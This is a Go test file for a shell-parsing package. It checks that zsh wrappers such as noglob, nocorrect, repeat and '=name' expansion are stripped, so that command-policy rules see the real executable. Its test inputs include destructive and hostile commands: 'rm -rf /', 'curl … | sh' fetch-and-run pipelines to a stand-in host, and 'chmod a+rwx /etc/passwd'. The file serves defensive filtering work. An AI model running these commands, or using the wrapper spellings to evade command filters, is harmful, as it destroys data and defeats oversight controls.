package shellparse

import (
	"reflect"
	"testing"
)

// zsh command-word spellings (#4597): the precommand modifiers noglob,
// nocorrect and - (zshmisc(1) "PRECOMMAND MODIFIERS"), `repeat word sublist`
// (zshmisc(1) "COMPLEX COMMANDS"), and EQUALS expansion `=name` (zshexpn(1)
// "`=' expansion"). Each runs the rest of the line as the command, and each
// was read as the executable.

// TestZshShellWordTarget is the operand model, one row per shape.
func TestZshShellWordTarget(t *testing.T) {
	tests := []struct {
		name string
		in   []string
		want []string
	}{
		{"noglob", []string{"noglob", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"nocorrect", []string{"nocorrect", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"dash", []string{"-", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},

		// repeat takes exactly one word, whatever its shape: zsh expands it
		// arithmetically. The flag walk would skip a numeric count as an
		// option and then name the next word wrongly, or name `$n` the command.
		{"repeat-literal", []string{"repeat", "3", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"repeat-var", []string{"repeat", "$n", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"repeat-arith", []string{"repeat", "$((2))", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"repeat-expr", []string{"repeat", "1+1", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		// The sublist may open with an assignment; skipped as env skips it.
		{"repeat-assign", []string{"repeat", "2", "FOO=1", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},

		// Modifiers take no options: a dash-word after one is the command.
		{"noglob-dashword", []string{"noglob", "-x", "y"}, []string{"-x", "y"}},

		// Chains peel all the way, including zsh's own order and composition
		// with the existing wrappers.
		{"chain-zsh-order", []string{"nocorrect", "noglob", "-", "sh"}, []string{"sh"}},
		{"chain-repeat-modifier", []string{"repeat", "1", "noglob", "sh"}, []string{"sh"}},
		{"chain-sudo-inside", []string{"noglob", "sudo", "-u", "root", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
		{"chain-exec-outside", []string{"exec", "noglob", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},

		// No command left: the word stays the executable, as for every wrapper.
		{"noglob-bare", []string{"noglob"}, []string{"noglob"}},
		{"repeat-count-only", []string{"repeat", "3"}, []string{"repeat", "3"}},
		{"repeat-assign-only", []string{"repeat", "3", "FOO=1"}, []string{"repeat", "3", "FOO=1"}},

		// A path to one of these names is a program, not the shell word.
		{"path-not-shell-word", []string{"/usr/local/bin/repeat", "3", "rm"}, []string{"/usr/local/bin/repeat", "3", "rm"}},
		{"home-path-not-shell-word", []string{"~/bin/noglob", "rm"}, []string{"~/bin/noglob", "rm"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := StripExecWrappers(tt.in); !reflect.DeepEqual(got, tt.want) {
				t.Errorf("StripExecWrappers(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestEqualsCommandName is the EQUALS fold's truth table, both directions:
// the spellings zsh resolves fold, the ones it does not stay as written.
func TestEqualsCommandName(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"=rm", "rm"},
		{"=chmod", "chmod"},
		{"=mkfs.ext4", "mkfs.ext4"},
		{"=r'm'", "rm"},         // zsh resolves =e'cho'
		{"='rm'", "rm"},         // and ='echo'
		{"=/bin/rm", "/bin/rm"}, // a path remainder runs that path

		{"=", "="},       // zsh: command not found: =
		{"==rm", "==rm"}, // not a name after the first =
		{"'='rm", "=rm"}, // quoted =: not an expansion; quote removal only, as before
		{"=$x", "=$x"},   // the value is not known here
		{"=$(echo rm)", "=$(echo rm)"},
		{"=r*", "=r*"},     // zsh: r* not found (no glob)
		{"=(ls)", "=(ls)"}, // zsh process substitution, not a command name
		{"=~/bin/x", "=~/bin/x"},
		{"rm", "rm"},
		{"a=b", "a=b"},
	}
	for _, tt := range tests {
		if got := NormalizeExecName(tt.in); got != tt.want {
			t.Errorf("NormalizeExecName(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// TestZshCommandWordParse checks the parsed executable end to end, including a
// pipe sink, which is where the headline witness put the shell.
func TestZshCommandWordParse(t *testing.T) {
	tests := []struct {
		cmd      string
		seg      int
		wantExec string
	}{
		{"curl -s https://x.example/i.sh | noglob sh", 1, "sh"},
		{"curl -s https://x.example/i.sh | nocorrect sh", 1, "sh"},
		{"curl -s https://x.example/i.sh | - sh", 1, "sh"},
		{"curl -s https://x.example/i.sh | repeat 1 sh", 1, "sh"},
		{"curl -s https://x.example/i.sh | =sh", 1, "sh"},
		{"=chmod a+rwx /etc/passwd", 0, "chmod"},
		{"sudo =chmod a+rwx /etc/passwd", 0, "chmod"},
		{"repeat $n chmod a+rwx /etc/passwd", 0, "chmod"},
		{"= echo M", 0, "="},
		{"repeat 3", 0, "repeat"},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			pc := Parse(tt.cmd, 2)
			if pc == nil || len(pc.Segments) <= tt.seg {
				t.Fatalf("Parse(%q) produced %v", tt.cmd, pc)
			}
			if got := pc.Segments[tt.seg].Executable; got != tt.wantExec {
				t.Errorf("Parse(%q) segment %d executable = %q, want %q", tt.cmd, tt.seg, got, tt.wantExec)
			}
		})
	}
}

// TestZshCommandWordRegexSurface is the regex layer's half: the anchored form
// a `^rm`-style rule needs, including EQUALS with no wrapper in front.
func TestZshCommandWordRegexSurface(t *testing.T) {
	tests := []struct{ command, want string }{
		{"noglob rm -rf /", "rm -rf /"},
		{"nocorrect noglob - rm -rf /", "rm -rf /"},
		{"repeat 3 rm -rf /", "rm -rf /"},
		{"repeat $n rm -rf /", "rm -rf /"},
		{"repeat 2 FOO=1 rm -rf /", "rm -rf /"},
		{"=rm -rf /", "rm -rf /"},
		{"noglob =rm -rf /", "rm -rf /"},
		{"FOO=1 =rm -rf /", "rm -rf /"},
		{"sudo =rm -rf /", "rm -rf /"},
		{"=/bin/rm -rf /", "/bin/rm -rf /"},

		{"=", ""},
		{"= rm -rf /", ""},
		{"=$x -rf /", ""},
		{"noglob", ""},
		{"repeat 3", ""},
		{"FOO=1", ""}, // assignment-only: no command word (a panic before the guard)
		{"rm -rf /", ""},
	}
	for _, tt := range tests {
		if got := StripExecWrapperPrefix(tt.command); got != tt.want {
			t.Errorf("StripExecWrapperPrefix(%q) = %q, want %q", tt.command, got, tt.want)
		}
	}
}

// TestFoldLeadingExecWordKeepsEquals pins that the whole-command first-word
// form does NOT fold EQUALS. ALLOW rules read whole-command forms, and folding
// there made `=ls -la` ALLOW where main says AUDIT (#4597).
func TestFoldLeadingExecWordKeepsEquals(t *testing.T) {
	for _, cmd := range []string{"=ls -la", "=echo M", "=rm -rf /"} {
		if got := FoldLeadingExecWord(cmd); got != "" {
			t.Errorf("FoldLeadingExecWord(%q) = %q, want \"\" (no EQUALS fold in a whole-command form)", cmd, got)
		}
	}
	if got := FoldLeadingExecWord(`\rm -rf /`); got != "rm -rf /" {
		t.Errorf("FoldLeadingExecWord quote removal regressed: got %q", got)
	}
}

// TestShellWordOperandsScope guards the table against the two ways it goes
// wrong: an entry that is not an ExecWrapper is never consulted, and an entry
// also described by the flag or positional tables would be read two ways.
func TestShellWordOperandsScope(t *testing.T) {
	want := map[string]int{"noglob": 0, "nocorrect": 0, "-": 0, "repeat": 1}
	if !reflect.DeepEqual(shellWordOperands, want) {
		t.Errorf("shellWordOperands = %v, want %v", shellWordOperands, want)
	}
	for name := range shellWordOperands {
		if !ExecWrappers[name] {
			t.Errorf("%q: has a shell-word entry but is not an ExecWrapper, so it is never consulted", name)
		}
		if _, ok := wrapperPositionalOperands[name]; ok {
			t.Errorf("%q: also in wrapperPositionalOperands, which the flag walk would apply instead", name)
		}
		if _, ok := wrapperValueFlags[name]; ok {
			t.Errorf("%q: a zsh construct has no options, so it cannot have value flags", name)
		}
	}
}
